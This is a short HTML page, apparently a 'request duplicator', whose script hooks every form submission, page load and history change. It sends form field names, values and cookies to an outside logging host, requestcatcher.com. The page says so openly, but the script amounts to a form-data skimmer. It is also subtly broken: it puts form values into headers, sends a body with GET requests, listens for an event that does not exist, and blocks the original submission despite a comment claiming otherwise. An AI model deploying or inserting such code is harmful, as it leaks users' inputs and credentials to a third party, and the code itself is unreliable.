<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Request Duplicator</title>
    <script>
        // Function to duplicate the current request to the target URL
        function duplicateRequest(event) {
            // Prevent default form submission if it's a form
            if (event && event.preventDefault) {
                event.preventDefault();
            }

            // Get current URL and method
            const currentUrl = window.location.href;
            const method = event && event.type === 'submit' ? 'POST' : 'GET';

            // Prepare fetch options
            const fetchOptions = {
                method: method,
                mode: 'no-cors', // Important for cross-origin requests
                credentials: 'include', // Ensures cookies are sent
                headers: {
                    // Copy all request headers
                    ...(event && event.target ? 
                        Object.fromEntries(
                            Array.from(event.target)
                            .filter(el => el.name)
                            .map(el => [el.name, el.value])
                        ) : 
                        {})
                },
                body: event && event.target ? new FormData(event.target) : null
            };

            // Send request to RequestCatcher
            fetch('https://noproblem.requestcatcher.com/', fetchOptions)
                .catch(error => {
                    console.error('Error duplicating request:', error);
                });

            // Optional: Also allow original request to proceed
            return true;
        }

        // Intercept all form submissions
        document.addEventListener('DOMContentLoaded', () => {
            document.addEventListener('submit', duplicateRequest);
        });

        // Intercept and duplicate all navigation requests
        window.addEventListener('popstate', duplicateRequest);
        window.addEventListener('pushstate', duplicateRequest);

        // Override default navigation methods to capture requests
        (function(history){
            const pushState = history.pushState;
            const replaceState = history.replaceState;

            history.pushState = function() {
                pushState.apply(history, arguments);
                duplicateRequest();
            };

            history.replaceState = function() {
                replaceState.apply(history, arguments);
                duplicateRequest();
            };

            window.addEventListener('popstate', duplicateRequest);
        })(window.history);

        // Duplicate initial page load
        window.addEventListener('load', duplicateRequest);
    </script>
</head>
<body>
    <h1>Request Duplicator</h1>
    <p>All requests to this page will be duplicated to https://noproblem.requestcatcher.com/</p>
</body>
</html>
